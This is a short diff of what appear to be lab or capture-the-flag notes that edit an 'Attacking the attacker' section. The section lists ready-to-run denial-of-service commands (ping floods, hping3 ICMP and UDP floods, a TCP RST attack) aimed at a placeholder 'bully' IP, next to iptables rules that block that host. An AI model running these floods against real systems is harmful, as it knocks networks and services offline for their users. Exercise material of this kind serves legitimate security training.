@@ -304,7 +304,7 @@ Username: agent
 Password: agent    
 What IP address is pinging Target6?
 
-**Attacking the attacker:**    
+**Attacking the attacker**    
 ICMP (ping flood)	Overloads bully’s ICMP traffic    
 #### `ping -f -s 65507 <bully-ip>`	    
 #### `hping3 --flood --icmp <bully-ip>`	    
@@ -313,9 +313,9 @@ TCP RST attack: Closes TCP connections on specific ports
 #### `hping3 --rst -p <port#> -c 10000 <bully-ip>`	  
 #### `iptables -A OUTPUT -p tcp --dport <port#> -d <bully-ip> -j DROP`	  
 
-UDP attack: Overload and Block:    
-#### `hping3 --flood --udp -p 9999 <bully-ip>`	    
-#### `iptables -A INPUT -p udp --sport 9999 -s <bully-ip> -j DROP`	    
+UDP attack: Overload and Block    
+#### `hping3 --flood --udp -p <port#> <bully-ip>`	    
+#### `iptables -A INPUT -p udp --sport <port#> -s <bully-ip> -j DROP`	    
     
     
 <div style="text-align: center;">
